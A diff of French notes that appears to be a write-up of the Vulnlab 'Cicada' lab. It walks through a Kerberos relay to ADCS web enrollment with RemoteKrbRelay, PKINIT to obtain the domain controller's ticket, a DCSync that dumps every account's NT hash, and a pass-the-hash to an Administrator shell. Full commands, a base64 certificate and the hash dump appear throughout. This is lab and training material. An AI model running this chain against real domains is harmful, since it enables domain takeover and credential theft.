@@ -167,12 +167,12 @@ Certificate Templates                   : [!] Could not find any certificate tem
 
 ESC8
 
+La sortie montre que l'inscription web est activée, ce qui est très souvent vulnérable car il est possible de relayer l'authentification NTLM au service d'inscription web en imposant (coerce) une demande d'authentification HTTP pour un certificat au nom du contrôleur de domaine, mais ici nous n'avons qu'un seul serveur et l'authentification NTLM est désactivée d'après ce que nous avons vu et l'"autorelayage" n'est pas possible.
+
 Solution :
 https://www.tiraniddo.dev/2024/04/relaying-kerberos-authentication-from.html
 https://i.blackhat.com/Asia-24/Presentations/Asia-24-Ding-CertifiedDCOM-The-Privilege-Escalation-Journey-to-Domain-Admin.pdf
 https://github.com/CICADA8-Research/RemoteKrbRelay
-
-La sortie montre que l'inscription web est activée, ce qui est très souvent vulnérable car il est possible de relayer l'authentification NTLM au service d'inscription web en imposant (coerce) une demande d'authentification HTTP pour un certificat au nom du contrôleur de domaine, mais ici nous n'avons qu'un seul serveur et l'authentification NTLM est désactivée d'après ce que nous avons vu et l'"autorelayage" n'est pas possible.
 
 Il est possible d'ajouter un compte machine si le quota le permet, ce qui peut être vérifié avec netexec
 
@@ -182,3 +182,104 @@ LDAP        DC-JPQ225.cicada.vl 389    DC-JPQ225.cicada.vl [+] cicada.vl\Rosie.P
 MAQ         DC-JPQ225.cicada.vl 389    DC-JPQ225.cicada.vl [*] Getting the MachineAccountQuota
 MAQ         DC-JPQ225.cicada.vl 389    DC-JPQ225.cicada.vl MachineAccountQuota: 10
 
+1) Connexion au VPN vulnlab sur la VM Windows + vérif
+2) Compiler l'outil RemoteKrbRelay
+3) Configuration manuel du DNS de la machine
+4) Ajouter la machine au domaine cicada.vl
+5) Switch user (sans fermer la session avec le VPN) et s'authentifié avec le compte de domaine Rosie.Powell
+6) Maintenant, pour exécuter kerberos réellement sur l'inscription web ADCS, un outil appelé RemoteKrbRelay peut être utilisé. Il est similaire à Krbrealyup sauf qu'il peut être utilisé pour exécuter le relais kerberos à distance au lieu de le faire localement. Ajouter la DLL BouncyCastle.Crypto dans le répertoire du binaire si besoin
+
+RemoteKrbRelay.exe -adcs -template DomainController -victim dc-jpq225.cicada.vl -target dc-jpq225.cicada.vl -clsid d99e6e74-fc88-11d0-b498-00a0c90312f3
+
+                            /\_/\____,
+                  ,___/\_/\ \  ~     /
+                  \     ~  \ )   XXX
+                    XXX     /    /\_/\___,
+                       \o-o/-o-o/   ~    /
+                        ) /     \    XXX
+                       _|    / \ \_/
+                    ,-/   _  \_/   \
+                   / (   /____,__|  )
+                  (  |_ (    )  \) _|
+                 _/ _)   \   \__/   (_
+                (,-(,(,(,/      \,),),)
+
+                CICADA8 Research Team
+                From Michael Zhmaylo (MzHmO)
+[+] Setting UP Rogue COM at port 12345
+[+] Registering...
+[+] Register success
+[+] Forcing Authentication
+[+] Using CLSID: d99e6e74-fc88-11d0-b498-00a0c90312f3
+[*] apReq: 6082071f06092a864886f71201020201006e82070e3082070aa003020105a10302010ea20703050020000000a3820546618205423082053ea003020105a10b1b094349434144412e564ca2263024a003020102a11d301b1b04485454501b1344432d4a50513232352e6369636164612e766ca3820500308204fca003020112a103020104a28204ee048204ea6d99cd84c3eef1588189aa1cb3eda58a9045da84af188be9e108f0f7866024c39f8281ad97b45233ec5d6c1acac28a6718075d7a81287e5c066796a0a71c0f5123d7d2fae48334fd306d789b45f55f28816a65c0a6945af4ff3b865c07e8bb4319b208f23608ab9cce2b25dd9c45daa1d8074acf7e4cabd99cd04c8de9475f163fd3c50dfd788072050e31fac525b77b2a873a636e09b1ab9548ce09680f6101a9c3418619e5bbbc2e02b83c746bdb1358ab7f73bf1d4ea48462c42b5790f29d1504f62476fe8b36c68240aa1121dcd12aac309107deb5da80ec7fa5ba1dcbe9e7826c9f8bfbcf220cf43fee36c225ba352d272e17bbd100bcf6478af5271aacaa6f57272a6325f3e415d15edc13803431c7c6e3795961d8ae821430901495a9357d74a976932cfe9cdf74856446d9eaf17178ffbd7219096859e2ce97c8fedb1e6fc634078e05a9f90c53898df314184aa151a5f30f4f0d45227b90f7936e6a4be99957c780d6ae03fa9248519c434f52618a12e9235fc092e730d3912cbd35aada3293defa6af46756db1f1c23c398c4449f2bf441f9dff40686cb0ef0f875fa5948085ed83d43565c56944089b5fdda3de0257b656dcaeb93c0303b80f083ff4fd58699e6eee78fc450cfc2dbd87246451e0a35a523c60468c39d46cd5a2d5c727ac7663e8521777d9c5369bf160061440cc4c7fca18734d3fe5fa24a6a37df160e3f4cad476bfee201a8e07e83ea4fe2ee04cd4ebe24450bd46bf682088868dd8f7c074ed1def0bcc497a606c63b6998be1180bb2276fe19ac064d750253dc971c02e6babef6b640050e7b21b7f03f903fd0c2aa3b25240e9f60a1cc9037140425105558a81bc8b48f6c9aad8e3fd4a472afc2bc42d5cd178e6414334739633160a58fb07424a323a7d9c9021499b808fd2087e834374d8e8427477fedd67d04783eb4973ec20b1e8f89e920190bc82d4e1b69847608a124df796a70c236a4974191c8ff79f70a270b1c8c4eb365e4c7c1dabdc6a5ccc4348ce585540bc47aaefbfc09e1c255957a00378022cbf04458b6cd485052e63ef2e48126b6c7fd4bf38322ef01a09ed3243c817bb8fbe0b8c9039583bb739f84dfb66f6af306dc78049e53910ffe6b86d3ddd32050a81e8a1a860629ab7089601e54196583873d58b343f434effa9ec7e00986fdda6acf65d1e92270ddbe4887a9b1fa627cf18b00e24d224866101c0ac558ca63929aae2a988f96889f1b993ab640ac62110e61310d33b852f9f69d275d44a8e2ad0acf4d51473bec584843f8fc16207445f59301720f288f75c30669be951db33518c4131bbb533a3212bf4ea5bca9135c5a8cad84d1c76122aa4a5f7d1e97ff52324a29c0a638f5cd3fc56d90c4136e92d50e91e273fcede17cb7238ac9b096f7c1b642b76c7652a76bf9efec490fe332a33bf44c22153833d2c50c90b9f11a1c0b27a5dbb30930a2e660869778a69e01dedff20a7d76a4d9a6111df1f854d75619bb6376121acce7627984b3c20ae6b6798980164df06b46dbea48c88ef20b23e74c8228a975126a7fcd4aa212d0237caeb517fd9b3344a6b44e68a3d8e980bcdd93e47f5a8f588f9007196a4db244a60bc71cb98ee9be125e90b16c45655e802afbab19882e6c99073f09c5e441995e8f799ca6e1b6a7a338647d64139de980d82fbca45970aad5d6b1b637f6bb0fce378092123b062f8968e1b18325a8b47f3845c02b22425127cf2b394223e58ac6d7ae7e764e64c7824f1b6227a48201a9308201a5a003020112a282019c048201981586896d0a48c6136777cc51495fad24f9c01a8f484b425a18167ae41de37af08eaa151c1d31569c655bdf8315834f75ba04b477c9f545796b43243132b7d1c3fdf43f61fab9431a778e21814b7a0669af2dffdb10d7c8b016d0c85bee2ab177c25d542322217b44bb329ceee8e0f4e984c544f08cb83071ae5ba5553aa4dda7adf75659540af51e1500dc8c4484c874dd33b9acf1c6dd36280e9c352da8e7944d7bb102909f1642eab75f7607ffc7f6c98898455b651f34e4d1caab7f7e14e853648eb53fbfadb026aa4a72ce214c35b2e39b7e921df47e5a9b2fd2cffa818f77644b3c9a9d42d52c8c0c20ca069a06359c6e3d872cdcdac709cbf715c7026612b594eff70647cbc94847a836882d9710772005b66078234cee40e1a5fa119d27cba0d950bb74d641eb782f603d4750d3f41daa5a09cf747a2d0818f8c422755aa3a49e876a61d3785a7e24c4e581056fc8f3228436e806ead97d63e783baadc525054c88b9c7045baaf9d5109326c7889026e24f1ccf27ff2118b5e7b887feddd1484b9db836553078d13bad10469c6cba3df1f2d99354
+[+] Got Krb Auth from NT/System. Relaying to ADCS now...
+[*] AcceptSecurityContext: SEC_I_CONTINUE_NEEDED
+[*] fContextReq: Delegate, MutualAuth, ReplayDetect, SequenceDetect, Confidentiality, UseDceStyle, Connection
+[+] Received Kerberos Auth from dc-jpq225.cicada.vl with ticket on http/dc-jpq225.cicada.vl
+[*] apRep2: 6f5b3059a003020105a10302010fa24d304ba003020112a2440442fb984f981591dd70d2358adbf7f314b158651142ec669077a2ff244018a7c5ce80d320473fd067e1c45afef0043d702b4ff473242594e3fc01491c2d82350bc7cec9
+[+] HTTP session established
+[+] Cookie ASPSESSIONIDCSBRDQAB=OKJHOMDDAFDPNNAOFNIOKDHL; path=/
+[+] Lets get certificate for "cicada.vl\dc-jpq225$" using "DomainController" template
+[+] Success (ReqID: 15)
+[+] Certificate in PKCS12: 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
+
+Utiliser PKINIT pour réaliser une requête pour récupérer le hash NT du DC
+
+gettgtpkinit.py -pfx-base64 <b64> -dc-ip 10.10.74.58 cicada.vl/'DC-JPQ225$' dc.ccache
+2025-02-01 21:04:48,391 minikerberos INFO     Loading certificate and key from file
+INFO:minikerberos:Loading certificate and key from file
+2025-02-01 21:04:49,133 minikerberos INFO     Requesting TGT
+INFO:minikerberos:Requesting TGT
+
+2025-02-01 21:05:00,303 minikerberos INFO     AS-REP encryption key (you might need this later):
+INFO:minikerberos:AS-REP encryption key (you might need this later):
+2025-02-01 21:05:00,303 minikerberos INFO     32e18825e7fab14444c847460107e0e07560450bd735398680aeb6dda046c4cf
+INFO:minikerberos:32e18825e7fab14444c847460107e0e07560450bd735398680aeb6dda046c4cf
+2025-02-01 21:05:00,306 minikerberos INFO     Saved TGT to file
+INFO:minikerberos:Saved TGT to file
+
+export KRB5CCNAME=dc.ccache
+
+DCSync
+
+secretsdump 'cicada.vl'/'DC-JPQ225$'@DC-JPQ225.cicada.vl -k -no-pass
+Impacket for Exegol - v0.10.1.dev1+20240403.124027.3e5f85b - Copyright 2022 Fortra - forked by ThePorgs
+
+[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8dd165a43fcb66d6a0e2924bb67e040c:::
+cicada.vl\Shirley.West:1104:aad3b435b51404eeaad3b435b51404ee:ff99630bed1e3bfd90e6a193d603113f:::
+cicada.vl\Jordan.Francis:1105:aad3b435b51404eeaad3b435b51404ee:f5caf661b715c4e1435dfae92c2a65e3:::
+cicada.vl\Jane.Carter:1106:aad3b435b51404eeaad3b435b51404ee:7e133f348892d577014787cbc0206aba:::
+cicada.vl\Joyce.Andrews:1107:aad3b435b51404eeaad3b435b51404ee:584c796cd820a48be7d8498bc56b4237:::
+cicada.vl\Daniel.Marshall:1108:aad3b435b51404eeaad3b435b51404ee:8cdf5eeb0d101559fa4bf00923cdef81:::
+cicada.vl\Rosie.Powell:1109:aad3b435b51404eeaad3b435b51404ee:ff99630bed1e3bfd90e6a193d603113f:::
+cicada.vl\Megan.Simpson:1110:aad3b435b51404eeaad3b435b51404ee:6e63f30a8852d044debf94d73877076a:::
+cicada.vl\Katie.Ward:1111:aad3b435b51404eeaad3b435b51404ee:42f8890ec1d9b9c76a187eada81adf1e:::
+cicada.vl\Richard.Gibbons:1112:aad3b435b51404eeaad3b435b51404ee:d278a9baf249d01b9437f0374bf2e32e:::
+cicada.vl\Debra.Wright:1113:aad3b435b51404eeaad3b435b51404ee:d9a2147edbface1666532c9b3acafaf3:::
+DC-JPQ225$:1000:aad3b435b51404eeaad3b435b51404ee:5b6e401181cee1644a69d1819211f969:::
+WIN11$:3101:aad3b435b51404eeaad3b435b51404ee:1adb1c3d9f82d5d69c6ea43d0ef3116b:::
+
+Récupération d'un TGT pour l'administrator
+
+getTGT.py cicada.vl/administrator@DC-JPQ225 -hashes aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87
+Impacket for Exegol - v0.10.1.dev1+20240403.124027.3e5f85b - Copyright 2022 Fortra - forked by ThePorgs
+
+[*] Saving ticket in administrator@DC-JPQ225.ccache
+export KRB5CCNAME=administrator@DC-JPQ225.ccache
+
+wmiexec.py cicada.vl/administrator@DC-JPQ225.cicada.vl -k -no-pass
+Impacket for Exegol - v0.10.1.dev1+20240403.124027.3e5f85b - Copyright 2022 Fortra - forked by ThePorgs
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>whoami
+cicada\administrator
+
+C:\>hostname
+DC-JPQ225
